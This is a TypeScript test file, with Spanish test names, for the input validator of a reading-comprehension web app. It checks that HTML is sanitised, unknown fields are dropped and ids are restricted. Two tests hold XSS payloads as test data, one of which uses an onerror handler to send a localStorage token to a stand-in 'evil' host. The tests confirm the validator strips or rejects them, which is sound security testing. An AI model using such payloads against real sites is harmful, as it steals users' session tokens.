import { test } from "node:test";
import assert from "node:assert/strict";

import { validar, idPublicable } from "../netlify/functions/readings.mts";
import { ApiError } from "../netlify/functions/_http.mts";

function lectura(cambios: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    title: "Remote work",
    body: ["First paragraph of the text.", "Second paragraph of the text."],
    qs: [0, 1, 2].map(k => ({ q: "Question " + k, o: ["a", "b", "c", "d"], a: k, e: "Porque <i>sí</i>." })),
    ...cambios,
  };
}

function rechaza(fn: () => unknown): void {
  assert.throws(fn, (e: unknown) => e instanceof ApiError && e.status === 422);
}

test("una lectura correcta pasa y conserva <b>/<i> en la explicación", () => {
  const r = validar(lectura());
  assert.equal(r.title, "Remote work");
  assert.equal(r.words, 10);
  assert.deepEqual(Object.keys(r.data), ["title", "body", "qs"]);
  assert.equal(r.data.qs[0].e, "Porque <i>sí</i>.");
});

test("la explicación maliciosa se guarda neutralizada", () => {
  const qs = [0, 1, 2].map(k => ({
    q: "Q" + k, o: ["a", "b", "c", "d"], a: 0,
    e: `<img src=x onerror="fetch('//evil?'+localStorage.getItem('token'))"><b>ok</b>`,
  }));
  const guardado = JSON.stringify(validar(lectura({ qs })).data);
  assert.ok(!guardado.includes("<img"), guardado);
  assert.ok(guardado.includes("<b>ok</b>"));
});

test("solo se guardan los campos conocidos", () => {
  const qs = [0, 1, 2].map(k => ({ q: "Q" + k, o: ["a", "b", "c", "d"], a: 0, e: "x", html: "<script>1</script>" }));
  const r = validar(lectura({ qs, extra: "<script>1</script>" }));
  assert.ok(!JSON.stringify(r.data).includes("script"));
  assert.deepEqual(Object.keys(r.data.qs[0]), ["q", "o", "a", "e"]);
});

test("el título se acota, en la columna y dentro de data", () => {
  const r = validar(lectura({ title: "x".repeat(5000) }));
  assert.equal(r.title.length, 140);
  assert.equal(r.data.title.length, 140);
  assert.equal(validar(lectura({ title: 42 })).title, "42");
  assert.equal(validar(lectura({ title: undefined })).data.title, "Texto generado");
});

test("se rechaza la forma incorrecta", () => {
  rechaza(() => validar(null));
  rechaza(() => validar("texto"));
  rechaza(() => validar(lectura({ body: ["solo uno"] })));
  rechaza(() => validar(lectura({ qs: [] })));
  const con = (q: Record<string, unknown>) =>
    lectura({ qs: [0, 1, 2].map(() => ({ q: "Q", o: ["a", "b", "c", "d"], a: 0, e: "x", ...q })) });
  rechaza(() => validar(con({ o: ["a", "b", "c"] })));
  rechaza(() => validar(con({ o: ["a", "b", "c", { toString: "x" }] })));
  rechaza(() => validar(con({ o: ["a", "b", "c", 4] })));
  rechaza(() => validar(con({ q: 7 })));
  rechaza(() => validar(con({ a: 4 })));
  rechaza(() => validar(con({ a: 1.5 })));
  rechaza(() => validar(con({ a: "1" })));
  rechaza(() => validar(con({ e: { html: "<script>" } })));
  rechaza(() => validar(con({ e: ["<script>"] })));
});

test("una pregunta sin explicación se acepta con la explicación vacía", () => {
  const qs = [0, 1, 2].map(() => ({ q: "Q", o: ["a", "b", "c", "d"], a: 0 }));
  assert.equal(validar(lectura({ qs })).data.qs[0].e, "");
});

test("el id solo admite letras, cifras, guion y guion bajo, hasta 64", () => {
  assert.equal(idPublicable("mb1x2k3abcd"), "mb1x2k3abcd");
  assert.equal(idPublicable("A-b_9"), "A-b_9");
  assert.equal(idPublicable("x".repeat(64)), "x".repeat(64));
  for (const malo of [
    `"><img src=x onerror=alert(1)>`, "<b>", "a b", "a.b", "ñ", "x".repeat(65), 42, {}, ["abc"], "a\n",
  ]) {
    rechaza(() => idPublicable(malo));
  }
});

test("sin id el servidor genera uno válido", () => {
  for (const vacio of [undefined, null, ""]) {
    assert.match(idPublicable(vacio), /^[A-Za-z0-9_-]{1,64}$/);
  }
});
